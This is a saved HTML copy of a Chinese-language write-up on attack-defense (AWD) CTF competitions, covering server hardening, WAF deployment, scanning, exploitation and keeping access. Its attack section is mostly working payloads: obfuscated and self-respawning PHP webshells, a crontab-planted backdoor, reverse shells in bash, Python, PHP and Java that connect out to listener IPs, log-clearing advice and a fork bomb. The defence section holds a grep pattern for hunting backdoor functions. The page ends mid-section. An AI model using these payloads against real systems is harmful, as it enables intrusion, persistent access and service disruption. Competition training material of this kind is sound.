<!DOCTYPE html>
<!-- saved from url=(0039)https://www.anquanke.com/post/id/245158 -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="renderer" content="webkit">
<meta name="force-rendering" content="webkit">
<meta name="referrer" content="always">
<meta name="description" content="安全客 - 安全资讯平台">
<link rel="icon" href="https://s3.ssl.qhres2.com/static/02b5158bbb6adeac.ico" type="image/x-icon">
<link rel="shortcut icon" href="https://s3.ssl.qhres2.com/static/02b5158bbb6adeac.ico" type="image/x-icon">
<meta name="keywords" content="安全媒体,安全资讯,安全知识, 安全热点,安全招聘,安全趋势,移动安全,网站安全,终端安全,无线安全,工控安全,物联网安全,WEB安全,系统安全,网络安全,区块链安全,安全活动,信息安全,安全预警,安全会议">

  <title>国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台</title>
  <meta name="description" content="安全客 - 安全资讯平台">
  <meta name="keywords" content="安全媒体,安全资讯,安全知识, 安全热点,安全招聘,安全趋势,移动安全,网站安全,终端安全,无线安全,工控安全,物联网安全,WEB安全,系统安全,网络安全,区块链安全,安全活动,信息安全,安全预警,安全会议">
  <script>(function(window){
        

function empty() {}

empty();
      })(this);</script>

<link rel="stylesheet" href="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/d4cec9cd8efbfd10.css">
<link rel="stylesheet" href="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/a51843d6b82241be,d94674bd62441768,56ce5cef8079a575,8514be0a921ca6e8,4802c0c382205144,8e4464e423fe6849,13c0bf3b0c2e4882,2b3936345af879da,f568b72da28701d3,da046392ff3eccb9,aa4b116b0af3b8cd,e0bfaead30.css">
<script>window._dynamic_deps_={}</script>
<style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
  position: absolute;
  top: 0;
  right: 0;
  left: 0;
  bottom: 0;
  z-index: 2147483647;
  display: flex;
  justify-content: center;
  align-items: center;
}

.immersive-translate-input-loading {
  --loading-color: #f78fb6;
  width: 6px;
  height: 6px;
  border-radius: 50%;
  display: block;
  margin: 12px auto;
  position: relative;
  color: white;
  left: -100px;
  box-sizing: border-box;
  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
}

@keyframes immersiveTranslateShadowRolling {
  0% {
    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  12% {
    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  25% {
    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
  }

  36% {
    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
  }

  50% {
    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color), 100px 0 var(--loading-color);
  }

  62% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color), 110px 0 var(--loading-color);
  }

  75% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color), 120px 0 var(--loading-color);
  }

  87% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
  }

  100% {
    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
  }
}
</style></head>

<body>
  <div id="app" data-v-app=""><div class="_9" style="height: 60px;"><div class="g-w"><a class="logo1" href="https://www.anquanke.com/"></a><div class="_10"><div class="item"><div style="cursor: pointer;"><span>首页</span><ul></ul></div></div><div class="item"><div><span>阅读</span><ul><li class="sub-item"><a href="https://www.anquanke.com/news">安全资讯</a></li><li class="sub-item"><a href="https://www.anquanke.com/knowledge">安全知识</a></li><li class="sub-item"><a href="https://www.anquanke.com/tool">安全工具</a></li></ul></div></div><div class="item"><div style="cursor: pointer;"><span>活动</span><ul></ul></div></div><div class="item"><div style="cursor: pointer;"><span>招聘</span><ul></ul></div></div><div class="item"><div style="cursor: pointer;"><span>安全导航</span><ul></ul></div></div><div class="item"><div style="cursor: pointer;"><span>内容精选</span><ul><li class="sub-item"><a href="https://www.anquanke.com/column/index.html">专栏</a></li><li class="sub-item"><a href="https://www.anquanke.com/subject-list">精选专题</a></li><li class="sub-item"><a href="https://www.anquanke.com/discovery">安全客季刊</a></li><li class="sub-item"><a href="https://www.anquanke.com/week-list">360网络安全周报</a></li></ul></div></div></div><div class="_11"><div class="block"><div class="search"><input class="input" placeholder="输入关键词搜索"><button class="button"></button></div><!----><div class="user-href js-login-body" style="display: none;"><div class="user-href-top"><p class="user-avatar-bottom"><img class="user-href-avatar"><!----></p><div class="user-href-top-main"><p class="user-href-grade"></p><p class="user-href-text"><span>累计积分</span><span>可用积分</span></p><p class="user-href-score"><span></span><span></span></p></div></div><ul><li><a href="https://www.anquanke.com/member.html?memberId=undefined">个人主页</a></li><li><a href="https://www.anquanke.com/setting?p=message">我的消息</a></li><li><a href="https://www.anquanke.com/user/set1.html">个人设置</a></li><li><a href="https://www.anquanke.com/user/score/search.html">积分商城</a></li><li>退出登录</li></ul></div><a href="https://www.anquanke.com/login/index.html" class="nologin"></a></div><span class="write"></span><a class="app" href="https://www.anquanke.com/app"><div class="app-img"><img src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t01103704213901dd1e.png"></div></a></div></div></div><div class="index"><div class="index-main"><div class="_55"><h1>国赛分区赛awd赛后总结-安心做awd混子</h1><div class="read"><p><span class="read-text">阅读量</span><b class="read-num">307546</b></p><p><span class="read-sep">|</span><span class="read-text">评论</span><b class="read-num">2</b></p><p><span class="read-sep">|</span><img class="read-fee" src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t01f942715e2a0f1a23.png"></p></div><p class="publish">发布时间 : 2021-06-30 10:00:01</p><div class="_54" style="display: none;"><b class="close">x</b><h5>译文声明</h5><p> 本文是翻译文章<!----><!----></p><!----><p>译文仅供参考，具体内容表达以及含义原文为准。</p></div><div class="content" id="js-article">


<p><img class="alignnone size-full wp-image-245419 aligncenter" alt="" width="718" height="373" src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t014b09264c422ce958.jpg"></p>
<p>&nbsp;</p>
<p>最近参加了国赛分区赛，我所在的分区正好是awd赛制，所以总结了下关于awd的基操，方便新手入门</p>
<p>简单来说就是三步</p>
<ol>
<li>登录平台，查看规则，探索flag提交方式，比赛开始前有时间的话使用nmap或者httpscan等工具扫一下IP段，整理各队的IP（靶机的IP应该是比赛开始后才会给出）</li>
<li>登录ssh-&gt;dump源码-&gt;D盾去后门-&gt;一人写批量脚本，一个人去修-&gt;部署waf，流量监控</li>
<li>控制npc-&gt;加固npc（拿到别人的靶机也是一样），紧盯流量</li>
</ol>
<p>下面来详细介绍具体流程</p>
<p>&nbsp;</p>
<h2 name="h2-0" id="h2-0">一般流程</h2>
<h3 name="h3-1" id="h3-1">
<a class="reference-link" name="1.%E7%99%BB%E5%BD%95%E6%AF%94%E8%B5%9B%E5%B9%B3%E5%8F%B0%EF%BC%8C%E6%9F%A5%E7%9C%8B%E6%AF%94%E8%B5%9B%E4%BF%A1%E6%81%AF"></a>1.登录比赛平台，查看比赛信息</h3>
<p>这此国赛主办方没有ssh密码，而是提供rsa公私钥，使用ssh-key方式进行登录</p>
<p>连接方法和密码方式相似，只不过是选择密钥而不用输入密码</p>
<p><img class="alignnone size-full wp-image-245401 aligncenter" alt="" width="539" height="481" src="./国赛分区赛awd赛后总结-安心做awd混子-安全客 - 安全资讯平台_files/t01e89d21af07f727b4.png"></p>
<p>如果主办方平台给的密码较为简单存在弱口令或者可能被爆破成功的机会，尽快修改密码，密码主要是三个方面</p>
<ul>
<li>linux修改ssh即本地密码passwd</li>
<li>修改后台登录密码mysql -u root -pshow databases；use test;show tables;
<p>select * from admin;</p>
<p>updata admin set user pass=’123456’; //updata 表名 set 字段名 = ‘值’;</p>
<p>flush privileges;</p>
</li>
<li>修改mysql登录密码方法一：mysql&gt;set password for root<a class="at-link" title="@localhost" href="https://github.com/localhost">@localhost</a> =password(‘ocean888’);config.php文件中是有数据库的连接信息，执行完上条命令后<strong>更改</strong>此文件方法二：
<p>mysqladmin -uroot -p 123456 password 123</p>
<p>root=用户名； 123456=旧密码； 123=新密码；</p>
</li>
</ul>
<h3 name="h3-2" id="h3-2">
<a class="reference-link" name="2.dump%E6%BA%90%E7%A0%81"></a>2.dump源码</h3>
<p>使用ssh工具保留源码，复制两份，用d盾去扫一份</p>
<p>注意：如果使用tar命令打包文件夹，.index.php（隐藏类型文件）将不会被打包</p>
<p>或者使用scp命令，后续会详细介绍使用方法</p>
<h4 id="h4-u6570u636Eu5E93u64CDu4F5C">
<a class="reference-link" name="%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C"></a>数据库操作</h4>
<p><strong>数据库备份</strong></p>
<p>登录数据库，命令备份数据库</p>
<ul>
<li>mysqldump -u db_user -p db_passwd db_name &gt; 1.sql //备份指定数据库</li>
<li>cd /var/lib/mysqlmysqldump -u db_user -p db_passwd &gt; 1.sql //先进入数据库目录再备份</li>
<li>mysqldump —all-databases &gt; 1.sql //备份所有数据库</li>
</ul>
<p><strong>数据库还原</strong></p>
<ul>
<li>mysql -u db_user -p db_passwd db_name &lt; 1.sql //还原指定数据库</li>
<li>cd /var/lib/mysqlmysql -u db_user db_passwd &lt; 1.sql //先进入数据库目录再还原</li>
</ul>
<h3 name="h3-3" id="h3-3">
<a class="reference-link" name="3.%E7%AB%99%E7%82%B9%E9%98%B2%E5%BE%A1%E9%83%A8%E7%BD%B2"></a>3.站点防御部署</h3>
<h4 id="h4-check-">
<a class="reference-link" name="check%EF%BC%9A"></a>check：</h4>
<ol>
<li>查看是否留有后门账户</li>
<li>关注是否运行了“特殊”进程</li>
<li>是否使用命令匹配一句话</li>
<li>关闭不必要端口，如远程登陆端口，木马端口</li>
</ol>
<h4 id="h4-action-">
<a class="reference-link" name="action%EF%BC%9A"></a>action：</h4>
<ol>
<li>d盾扫描删除预留后门文件，代码审计工具审计</li>
<li>流量监控脚本部署</li>
<li>WAF脚本部署<strong>挂waf：</strong>
<ul>
<li>每个文件前边加 require_once(waf.php);</li>
<li>改 .user.ini配置文件 auto_prepend_file=&lt;filename&gt;; 包含在文件头auto_append_file=&lt;filename&gt;; 包含在文件尾</li>
</ul>
<p>注：如果挂了waf出现持续扣分，waf去掉</p>
</li>
<li>文件监控脚本部署<strong>注意：</strong>现上好waf再上文件监控靶机没有python的话要先安python（视情况而定）</li>
</ol>
<h3 name="h3-4" id="h3-4">
<a class="reference-link" name="4.%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E5%BE%97%E5%88%86"></a>4.利用漏洞进行得分</h3>
<p>利用漏洞进行既包括自己去审计挖掘漏洞，也包括看流量分析出其他师傅发现的漏洞的复现</p>
<h3 name="h3-5" id="h3-5">
<a class="reference-link" name="5.%E7%BC%96%E5%86%99%E8%84%9A%E6%9C%AC%E6%89%B9%E9%87%8F%E6%8B%BF%E5%88%86"></a>5.编写脚本批量拿分</h3>
<ol>
<li>通过预留后门批量拿分</li>
<li>批量修改ssh账号密码</li>
<li>通过脚本批量获取flag</li>
<li>脚本批量提交flag</li>
</ol>
<p>以上就是简单来说awd开局需要做的5件事，一下从攻击和防御两个方面来具体介绍awd玩法</p>
<p>&nbsp;</p>
<h2 name="h2-6" id="h2-6">攻击</h2>
<h3 name="h3-7" id="h3-7">
<a class="reference-link" name="%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"></a>服务发现</h3>
<p>使用nmap对c段或端口进行扫描（看主办方给的靶机情况而定）</p>
<h4 id="h4-nmap">
<a class="reference-link" name="nmap"></a>nmap</h4>
<ul>
<li>知道IP地址扫端口
<pre><code class="hljs language-undefined">.\nmap 10.241.180.159 -p1-65535
</code></pre>
</li>
<li>扫C段
<pre><code class="hljs language-undefined">.\nmap 10.241.180.159/24
</code></pre>
</li>
<li>根据ip列表扫，有一个ip地址列表，将这个保存为一个txt文件，和namp在同一目录下,扫描这个txt内的所有主机
<pre><code class="hljs language-undefined">nmap -iL ip.txt
</code></pre>
</li>
</ul>
<p>nmap扫描完毕后，win按住alt键</p>
<p><img class="alignnone size-full wp-image-245402 aligncenter" alt="" width="563" height="638" data-original="https://p0.ssl.qhimg.com/t01d10881e9d5c1df6f.png"></p>
<p>只提取端口</p>
<h3 name="h3-8" id="h3-8">
<a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用</h3>
<p>awd中存在较多的主要是以下几种漏洞</p>
<ul>
<li>命令执行，直接cat /flag，尽量混淆流量也可以通过命令执行执行上传一句话木马，直接用py脚本批量传，美哉</li>
</ul>
<pre><code class="lang-bash hljs language-bash"><span class="hljs-built_in">echo</span> PD9waHAgZXZhbCgkX1JFUVVFU1RbJzEnXSk7ID8+Cg==|base64 -d&gt;&gt;.index.php

<span class="hljs-comment"># &lt;?php eval($_REQUEST['1']); ?&gt;</span>
</code></pre>
<ul>
<li>文件读取，直接读取或者是伪协议方式读取flag</li>
<li>sql注入，数据库中有flag，或者sql注入写shell</li>
<li>文件上传，绕过黑白名单上传一句话，小马拉大马或者不死马</li>
<li>awd时间一般较短，所以漏洞不会太深，比较容易发现，有的会直接放几个明显的后门，考验选手们的手速</li>
</ul>
<h3 name="h3-9" id="h3-9">
<a class="reference-link" name="%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"></a>权限维持</h3>
<h4 id="h4-u8FC7u76FEu4E00u53E5u8BDD">
<a class="reference-link" name="%E8%BF%87%E7%9B%BE%E4%B8%80%E5%8F%A5%E8%AF%9D"></a>过盾一句话</h4>
<pre><code class="lang-php hljs language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$b</span>=<span class="hljs-string">"a="</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>];parse_str(<span class="hljs-variable">$b</span>);print_r(`<span class="hljs-variable">$a</span>`)<span class="hljs-meta">?&gt;</span>
</code></pre>
<p>可以改造成header返回的马，可以把这个一句话木马放到index.php中，直接访问index.php，从header中拿到flag，既不容易被发现马，又不容易被其他队利用</p>
<pre><code class="lang-php hljs language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$b</span>=<span class="hljs-string">"a="</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>];parse_str(<span class="hljs-variable">$b</span>);<span class="hljs-variable">$k</span>=(`<span class="hljs-variable">$a</span>`);header(<span class="hljs-string">'cookie:'</span>.<span class="hljs-variable">$k</span>);<span class="hljs-meta">?&gt;</span>

<span class="hljs-variable">$a</span>=<span class="hljs-number">1</span>;<span class="hljs-variable">$b</span>=<span class="hljs-string">"a="</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'a'</span>];parse_str(<span class="hljs-variable">$b</span>);<span class="hljs-variable">$k</span>=(`<span class="hljs-variable">$a</span>`);header(<span class="hljs-string">'cookie:'</span>.<span class="hljs-variable">$k</span>);
</code></pre>
<h4 id="h4-u4E0Du6B7Bu9A6C">
<a class="reference-link" name="%E4%B8%8D%E6%AD%BB%E9%A9%AC"></a>不死马</h4>
<ul>
<li>php file_put_contents写入不死马</li>
</ul>
<pre><code class="lang-php hljs language-php">file_put_contents(<span class="hljs-string">'.1ndex.php'</span>,base64_decode(<span class="hljs-string">'PD9waHAgIAogICAgc2V0X3RpbWVfbGltaXQoMCk7ICAKICAgIGlnbm9yZV91c2VyX2Fib3J0KDEpOyAgCiAgICB1bmxpbmsoX19GSUxFX18pOyAgCiAgICB3aGlsZSgxKXsgIAogICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCcubG5kZXgucGhwJywnPD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iNTAxNjBjMmVjNGY0MGQ3M2Y5MDYxZjg5NjcxMjExNTciKXtAZXZhbCgkX1BPU1RbImNtZCJdKTt9ID8+Jyk7ICAKICAgICAgICBzbGVlcCgwKTsgIAogICAgfQo/Pg=='</span>));
</code></pre>
<p>get：pass=ocean888@.cn</p>
<p>post：cmd=system(“ls”);</p>
<ul>
<li>linux命令不死马</li>
</ul>
<pre><code class="lang-python hljs language-python"><span class="hljs-keyword">while</span> true;do echo <span class="hljs-string">'&lt;?php eval($_POST["x"]);?&gt;'</span> &gt; x.php;sleep <span class="hljs-number">1</span>;done
</code></pre>
<ul>
<li>普通php不死马</li>
</ul>
<pre><code class="lang-php hljs language-php"><span class="hljs-meta">&lt;?php</span> 
ignore_user_abort(<span class="hljs-literal">true</span>);
set_time_limit(<span class="hljs-number">0</span>);
unlink(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-variable">$file</span> = <span class="hljs-string">'.index.php'</span>;
<span class="hljs-variable">$code</span> = <span class="hljs-string">'&lt;?php if(md5($_GET["pass"])=="b1d2442581854c7e769e8ad870b50acd"){@eval($_REQUEST[a]);} ?&gt;'</span>;
<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>){
    file_put_contents(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);
    usleep(<span class="hljs-number">5</span>);
}
<span class="hljs-meta">?&gt;</span>


<span class="hljs-comment">#密码 ocean888@.cn</span>
<span class="hljs-comment">#文件名 .index.php  .DS_story</span>

<span class="hljs-meta">&lt;?php</span>
    set_time_limit(<span class="hljs-number">0</span>);
    ignore_user_abort(<span class="hljs-number">1</span>);
    unlink(<span class="hljs-keyword">__FILE__</span>);
    <span class="hljs-comment">//file_put_contents(__FILE__,'');</span>
    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){
        file_put_contents(<span class="hljs-string">'path/webshell.php'</span>,<span class="hljs-string">'&lt;?php @eval($_POST["password"]);?&gt;'</span>);
    }
<span class="hljs-meta">?&gt;</span>
</code></pre>
<p>密码复杂，生成文件隐藏 .DS_store(原 .DS_Store)</p>
<ul>
<li>
<h4 id="h4-crontab-">
<a class="reference-link" name="crontab%E5%86%99%E9%A9%AC"></a>crontab写马</h4>
</li>
</ul>
<pre><code class="lang-bash hljs language-bash">system(<span class="hljs-string">'echo "* * * * * echo \"&lt;?php  if(md5(\\\\\\\\\$_POST[pass])==\'</span>50160c2ec4f40d73f9061f8967121157\<span class="hljs-string">'){@eval(\\\\\\\\\$_POST[1]);}  \" &gt; /var/www/html/.index.php\n* * * * * chmod 777 /var/www/html/.index.php" | crontab;whoami'</span>);
</code></pre>
<p>密码：ocean888@.cn</p>
<p><code>crontab -u www-data CRON_FILE</code> 来指定用户运行指定的定时任务</p>
<p>也可以使用cromtab直接在对方靶机上提交flag，隐蔽且狗</p>
<p>推荐：nu1l的ctfer从0到1，里面介绍了一些隐蔽的手段</p>
<h4 id="h4-bash-shell">
<a class="reference-link" name="bash%E5%8F%8D%E5%BC%B9shell"></a>bash反弹shell</h4>
<p>nc反弹shell</p>
<pre><code class="lang-bash hljs language-bash">bash -i &gt;&amp; /dev/tcp/10.243.32.32/9 0&gt;&amp;1
本地 nc -l -p 8080
</code></pre>
<p><img class="alignnone size-full wp-image-245403 aligncenter" alt="" width="1135" height="419" data-original="https://p4.ssl.qhimg.com/t01c54a9b6fdf8ea8db.png"></p>
<p><img class="alignnone size-full wp-image-245405 aligncenter" alt="" width="1041" height="512" data-original="https://p1.ssl.qhimg.com/t0185d44e8c0aba596b.png"></p>
<p>可以切换到bash命令去执行，但是使用bash命令会生成bash_history</p>
<h4 id="h4-python-shell">
<a class="reference-link" name="python%E5%8F%8D%E5%BC%B9shell"></a>python反弹shell</h4>
<pre><code class="hljs language-bash">python -c <span class="hljs-string">"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.99.242',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</span>
</code></pre>
<h4 id="h4-php-shell">
<a class="reference-link" name="php%E5%8F%8D%E5%BC%B9shell"></a>php反弹shell</h4>
<pre><code class="lang-php hljs language-php">php -r <span class="hljs-string">'$sock=fsockopen("10.243.32.53",9999);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
</code></pre>
<p>此条命令将会返回一个和靶机相同的用户权限，使用php脚本反弹shell一般是www-data权限</p>
<p><img class="alignnone size-full wp-image-245406 aligncenter" alt="" width="1059" height="184" data-original="https://p2.ssl.qhimg.com/t01ed58560cfd5efff4.png"></p>
<p><img class="alignnone size-full wp-image-245407 aligncenter" alt="" width="1106" height="301" data-original="https://p4.ssl.qhimg.com/t0133a1827d6b90f776.png"></p>
<p>建议连着kill两次</p>
<h4 id="h4-java-shell">
<a class="reference-link" name="java%E5%8F%8D%E5%BC%B9shell"></a>java反弹shell</h4>
<pre><code class="lang-java hljs language-java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Revs</span> {
    <span class="hljs-comment">/**
    * <span class="hljs-doctag">@param</span> args
    * <span class="hljs-doctag">@throws</span> Exception 
    */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// TODO Auto-generated method stub</span>
        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();
        String cmd[]= {<span class="hljs-string">"/bin/bash"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"exec 5&lt;&gt;/dev/tcp/192.168.99.242/1234;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>};
        <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> r.exec(cmd);
        p.waitFor();
    }
}
</code></pre>
<p>保存为Revs.java文件，编译执行，成功反弹shell。</p>
<p>javac Revs.java<br>
java Revs</p>
<h4 id="h4--bash_history">
<a class="reference-link" name="%E6%B8%85%E9%99%A4bash_history"></a>清除bash_history</h4>
<p>使用bash命令，会在root目录生成名为~/.bash_history的历史记录文件，建议清除记录，隐藏行踪</p>
<h3 name="h3-10" id="h3-10">
<a class="reference-link" name="%E6%89%B9%E9%87%8F%E8%84%9A%E6%9C%AC"></a>批量脚本</h3>
<h4 id="h4--flag">
<a class="reference-link" name="%E6%89%B9%E9%87%8F%E4%BA%A4flag"></a>批量交flag</h4>
<p>有的比赛会提前说提交flag的方法，这样我们就可以提前写好脚本，找到漏洞小改一下就能用了</p>
<p><img class="alignnone size-full wp-image-245409 aligncenter" alt="" width="692" height="258" data-original="https://p0.ssl.qhimg.com/t016b0ef4c88c600349.png"></p>
<p>假设有文件读取的话，就可以批量获取并提交flag</p>
<pre><code class="lang-python hljs language-python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">def</span> <span class="hljs-title function_">getFlag</span>(<span class="hljs-params">ip, port, <span class="hljs-built_in">dir</span></span>)
    fullUrl = <span class="hljs-string">"http://"</span> + ip + <span class="hljs-string">":"</span> + port + url
    res = requests.get(url = fullUrl)
    <span class="hljs-keyword">return</span> res.text

<span class="hljs-keyword">def</span> <span class="hljs-title function_">subFlag</span>(<span class="hljs-params">r_time, ip, port, <span class="hljs-built_in">dir</span>, token</span>):
    <span class="hljs-comment">#Set submit flag url</span>
    f_url = <span class="hljs-string">'http://10.10.10.10/api/v1/att_def/web/submit_flag/?event_id=21'</span>
    <span class="hljs-comment">#Set token</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> ip:
            <span class="hljs-comment"># q是单个ip，port是端口，shell为初始后门的地址，passwd为初始后门的密码</span>
            flag_tmp = get_flag(ip, port, <span class="hljs-built_in">dir</span>)
            s_f_pay = {
                <span class="hljs-string">'flag'</span>:flag_tmp,
                <span class="hljs-string">'token'</span>:token
            }

            <span class="hljs-comment"># r = requests.post(url,headers=headers,data = json.dumps(data))</span>
            r = requests.post(f_url, data = s_f_pay)
            <span class="hljs-built_in">print</span>(r.text)
        time.sleep(r_time * <span class="hljs-number">60</span>)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span> :
    <span class="hljs-comment"># 这个可以看请况写个循环，遍历出所有ip</span>
    subFlag(<span class="hljs-number">10</span>, <span class="hljs-number">172.35</span><span class="hljs-number">.19</span><span class="hljs-number">.11</span>, <span class="hljs-number">80</span>, <span class="hljs-string">"/statics/1.php?file=../../../../../../flag"</span>, <span class="hljs-string">"FUPDSjgifpoejsiJIFPjipojfdsa"</span>)
</code></pre>
<h4 id="h4-brup-">
<a class="reference-link" name="brup%E6%8F%92%E4%BB%B6"></a>brup插件</h4>
<p>使用burp提供的burp-requests插件更快的写出poc，安装方法可以百度下，和其他的插件安装方法一致</p>
<p>当找到漏洞利用方法时，可以抓取流量，burp界面空白处右击，选择copy as requests</p>
<p><img class="alignnone size-full wp-image-245410 aligncenter" alt="" width="1053" height="430" data-original="https://p5.ssl.qhimg.com/t01349d3c5f8f85a3e0.png"></p>
<p>直接复制到python脚本里就可以</p>
<p>效果如下</p>
<p><img class="alignnone size-full wp-image-245411 aligncenter" alt="" width="1068" height="159" data-original="https://p0.ssl.qhimg.com/t01cfbd67f482ef1b7a.png"></p>
<h4 id="h4-aoiawd-">
<a class="reference-link" name="Aoiawd%E6%89%B9%E9%87%8F"></a>Aoiawd批量</h4>
<p>Aoiawd是安恒实验室研发的一款awd神器，后面单独部分介绍</p>
<p>使用Aoiawd的流量监测功能，一键生成poc，批量拿flag</p>
<h4 id="h4-u6405u5C4E">
<a class="reference-link" name="%E6%90%85%E5%B1%8E"></a>搅屎</h4>
<p>fork炸弹</p>
<pre><code class="hljs language-ruby"><span class="hljs-comment"># 参考: https://linux.cn/article-5685-1-rss.html</span>
<span class="hljs-symbol">:</span>(){<span class="hljs-symbol">:|</span><span class="hljs-symbol">:&amp;</span>};:
</code></pre>
<p>&nbsp;</p>
<h2 name="h2-11" id="h2-11">防御</h2>
<p>防御主要包括三个监控：</p>
<p>文件监控</p>
<p>流量监控</p>
<p>端口监控</p>
<h3 name="h3-12" id="h3-12">
<a class="reference-link" name="%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4"></a>实用命令</h3>
<ul>
<li>查找可能的password
<pre><code class="hljs language-bash"><span class="hljs-built_in">cd</span> /var/www/html
find .|xargs grep <span class="hljs-string">"password"</span>
</code></pre>
</li>
<li>查找后门
<pre><code class="hljs language-bash">find /var/www/html -name <span class="hljs-string">"*.php"</span> |xargs egrep <span class="hljs-string">'assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\('</span>
</code></pre>
</li>
<li>查找flag的位置
<pre><code class="hljs language-go">使用 <span class="hljs-string">`find / -name *flag*`</span> 或 <span class="hljs-string">`grep -rn "flag" *`</span> 类似的语句可以快速发现 flag 所在的地方，方便后续拿分
</code></pre>
</li>
<li>备份网站源码和数据库
<ol>
<li>mobaxterm直接拖</li>
</ol>
<p>​ 备份数据库在dump源码部分有</p>
<ol>
<li>linux命令进行备份</li>
</ol>
<pre><code class="lang-bash hljs language-bash">scp -r -P Port remote_username&lt;a class=<span class="hljs-string">"at-link"</span> title=<span class="hljs-string">"@remote_ip"</span> href=<span class="hljs-string">"https://github.com/remote_ip"</span>&gt;@remote_ip&lt;/a&gt;:remote_folder local_file
</code></pre>
</li>
<li>检查有没有多余无用端口对外开放
<pre><code class="lang-bash hljs language-bash">netstat -anptl
</code></pre>
</li>
</ul>
<h3 name="h3-13" id="h3-13">
<a class="reference-link" name="%E9%83%A8%E7%BD%B2waf"></a>部署waf</h3>
<p>waf部署需要谨慎，分为两种情况：无check机制、部分检查不允许上通防waf，有些比赛上通防可能会扣掉很多分实在不划算</p>
<p>还需要注意的是：上完waf检查服务是否可用</p>
<h4 id="h4--check-">
<a class="reference-link" name="%E6%97%A0check%E6%9C%BA%E5%88%B6"></a>无check机制</h4>
<p>估计无check机制的比赛也没啥可玩性了，推荐watch bird和aoiawd，直接防护全开，替换flag，流量转发完事儿，或者有的连页面都不check的直接删站看他咋拿flag</p>
<h4 id="h4-u90E8u5206u68C0u67E5">
<a class="reference-link" name="%E9%83%A8%E5%88%86%E6%A3%80%E6%9F%A5"></a>部分检查</h4>
<p>部分检查允许使用部分小的waf，会检查页面完整性、服务完整性</p>
<p>直接github找一些waf即可，一下介绍一些waf部署方法</p>
<p><strong>有root权限</strong></p>
<p>1.</p>
<pre><code class="lang-bash hljs language-bash"><span class="hljs-comment">#每个文件前边加 require_once(waf.php);</span>
find /var/www/html -<span class="hljs-built_in">type</span> f -path <span class="hljs-string">"*.php"</span> | xargs sed -i <span class="hljs-string">"s/&lt;?php/&lt;?phpnrequire_once('./log.php');n/g"</span>

